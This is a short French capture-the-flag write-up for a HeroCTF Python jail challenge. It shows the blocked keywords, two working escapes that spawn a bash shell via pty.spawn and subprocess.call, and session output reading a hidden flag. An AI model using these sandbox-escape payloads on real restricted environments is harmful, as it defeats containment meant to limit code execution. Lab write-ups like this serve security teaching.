Dans ce deuxième PyJail, l'accès aux mots "os", "ls", "cat", "chmod", "cd" etc a été bloqué.

La solution est donc de faire pop directement un shell.

Par exemple :
```bash
Enter your code below:
import pty
pty.spawn('/bin/bash')
EOF
pwnuser@480dd7fb733f:~$ ls
ls
entry.sh  flag.txt  programs  shell.py
pwnuser@480dd7fb733f:~$ cat flag.txt
cat flag.txt
Ahahaha not here !
pwnuser@480dd7fb733f:~$ ls -al
ls -al
total 40
drwxr-xr-x 1 pwnflag pwnflag 4096 Apr 12 22:50 .
drwxr-xr-x 1 root    root    4096 Apr 12 22:21 ..
-rw-r--r-- 1 pwnuser pwnuser  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 pwnuser pwnuser 3789 Apr 12 22:21 .bashrc
-rw-r--r-- 1 pwnuser pwnuser  807 Apr  4  2018 .profile
-rw-r--r-- 1 root    root      24 Apr 12 22:50 .thefl4gIsHere.txt
-rwsr-xr-x 1 root    root     136 Apr 12 22:45 entry.sh
-rw-r--r-- 1 root    root      19 Apr 12 22:45 flag.txt
drwxr-xr-x 1 root    root    4096 Apr 12 22:50 programs
-rwsr-xr-x 1 pwnflag pwnflag 1445 Apr 12 22:45 shell.py
pwnuser@480dd7fb733f:~$ cat .thefl4gIsHere.txt
cat .thefl4gIsHere.txt
HeroCTF{sup3r_sh3ll_!!}
```
(On se fait évidemment avoir par le flag.txt ...)
On peut aussi faire spawn un shell avec subprocess :
```bash
Enter your code below:
import subprocess
subprocess.call("/bin/bash")
EOF
whoami
pwnuser
id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
ls -al
total 40
drwxr-xr-x 1 pwnflag pwnflag 4096 Apr 12 22:50 .
drwxr-xr-x 1 root    root    4096 Apr 12 22:21 ..
-rw-r--r-- 1 pwnuser pwnuser  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 pwnuser pwnuser 3789 Apr 12 22:21 .bashrc
-rw-r--r-- 1 pwnuser pwnuser  807 Apr  4  2018 .profile
-rw-r--r-- 1 root    root      24 Apr 12 22:50 .thefl4gIsHere.txt
-rwsr-xr-x 1 root    root     136 Apr 12 22:45 entry.sh
-rw-r--r-- 1 root    root      19 Apr 12 22:45 flag.txt
drwxr-xr-x 1 root    root    4096 Apr 12 22:50 programs
-rwsr-xr-x 1 pwnflag pwnflag 1445 Apr 12 22:45 shell.py
cat .thefl4gIsHere.txt
HeroCTF{sup3r_sh3ll_!!}
```
(EOF = End Of File)

HeroCTF{sup3r_sh3ll_!!}
